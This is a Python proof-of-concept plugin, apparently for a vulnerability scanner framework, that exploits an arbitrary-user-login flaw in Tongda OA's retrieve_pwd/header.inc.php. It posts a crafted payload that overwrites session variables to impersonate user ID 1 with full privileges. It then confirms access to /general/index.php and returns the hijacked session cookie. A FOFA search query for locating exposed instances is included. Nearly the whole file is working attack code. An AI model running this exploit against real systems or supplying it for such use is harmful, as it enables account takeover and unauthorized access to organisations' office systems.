# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "通达OA retrieve_pwd 任意用户登陆漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "通达OA",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。 
            通达OA前台存在未授权访问漏洞，可以获取会议通知信息
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="TDXK-通达OA"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/module/retrieve_pwd/header.inc.php" # url自己按需调整
        data0 = """_SESSION%5BLOGIN_THEME%5D=15&_SESSION%5BLOGIN_USER_ID%5D=1&_SESSION%5BLOGIN_UID%5D%3D1%26_SESSION%5BLOGIN_FUNC_STR%5D=1%2C3%2C42%2C643%2C644%2C634%2C4%2C147%2C148%2C7%2C8%2C9%2C10%2C16%2C11%2C130%2C5%2C131%2C132%2C256%2C229%2C182%2C183%2C194%2C637%2C134%2C37%2C135%2C136%2C226%2C253%2C254%2C255%2C536%2C24%2C196%2C105%2C119%2C80%2C96%2C97%2C98%2C114%2C126%2C179%2C607%2C539%2C251%2C127%2C238%2C128%2C85%2C86%2C87%2C88%2C89%2C137%2C138%2C222%2C90%2C91%2C92%2C152%2C93%2C94%2C95%2C118%2C237%2C108%2C109%2C110%2C112%2C51%2C53%2C54%2C153%2C217%2C150%2C239%2C240%2C218%2C219%2C43%2C17%2C18%2C19%2C15%2C36%2C70%2C76%2C77%2C115%2C116%2C185%2C235%2C535%2C59%2C133%2C64%2C257%2C2%2C74%2C12%2C68%2C66%2C67%2C13%2C14%2C40%2C41%2C44%2C75%2C27%2C60%2C61%2C481%2C482%2C483%2C484%2C485%2C486%2C487%2C488%2C489%2C490%2C491%2C492%2C120%2C494%2C495%2C496%2C497%2C498%2C499%2C500%2C501%2C502%2C503%2C505%2C504%2C26%2C506%2C507%2C508%2C515%2C537%2C122%2C123%2C124%2C628%2C125%2C630%2C631%2C632%2C633%2C55%2C514%2C509%2C29%2C28%2C129%2C510%2C511%2C224%2C39%2C512%2C513%2C252%2C230%2C231%2C232%2C629%2C233%2C234%2C461%2C462%2C463%2C464%2C465%2C466%2C467%2C468%2C469%2C470%2C471%2C472%2C473%2C474%2C475%2C200%2C202%2C201%2C203%2C204%2C205%2C206%2C207%2C208%2C209%2C65%2C187%2C186%2C188%2C189%2C190%2C191%2C606%2C192%2C193%2C221%2C550%2C551%2C73%2C62%2C63%2C34%2C532%2C548%2C640%2C641%2C642%2C549%2C601%2C600%2C602%2C603%2C604%2C46%2C21%2C22%2C227%2C56%2C30%2C31%2C33%2C32%2C605%2C57%2C609%2C103%2C146%2C107%2C197%2C228%2C58%2C538%2C151%2C6%2C534%2C69%2C71%2C72%2C223%2C639%2C225%2C236%2C78%2C178%2C104%2C121%2C149%2C84%2C99%2C100%2C533%2C101%2C113%2C198%2C540%2C626%2C638%2C38%2C&_SESSION%5BLOGIN_USER_PRIV%5D=1&_SESSION%5BLOGIN_USER_PRIV_OTHER%5D=1&_SESSION%5BLOGIN_USER_PRIV_TYPE%5D=1&_SESSION%5BLOGIN_NOT_VIEW_USER%5D=0&_SESSION%5BRETRIEVE_PWD_USER%5D=2s"""
        url1 = self.target + "/general/index.php?isIE=0&modify_pwd=0"

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and "text/html" in req0.headers["Content-Type"] and "MYOA_STATIC_SERVER" in req0.text:
                # vuln = [True,req0.text]
                cookie = req0.headers["Set-Cookie"].split(";")[0].strip()
                headers["Cookie"] = cookie
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and "text/html" in req1.headers["Content-Type"] and "var loginUser" in req1.text:
                    vuln = [True,"<title> Url: %s | Cookie: %s </title>" % (url1,cookie)]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()